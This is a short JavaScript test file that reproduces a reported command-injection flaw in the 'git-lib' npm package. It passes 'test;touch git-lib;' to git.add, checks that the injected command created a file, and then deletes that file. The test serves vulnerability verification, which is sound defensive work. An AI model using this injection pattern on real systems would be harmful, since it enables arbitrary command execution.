//https://hackerone.com/reports/718241
test("Remote code execution in git-lib", () => {
  const git = require("git-lib");
  const fs = require("fs");
  const path = "./git-lib";
  //const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    git.add("test;touch git-lib;").then(function () {
      //checking that its created by after exploit.
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);

      fs.unlink(path, function (err) {}); //deleting the file after creation
    });
  } catch (error) {}
});
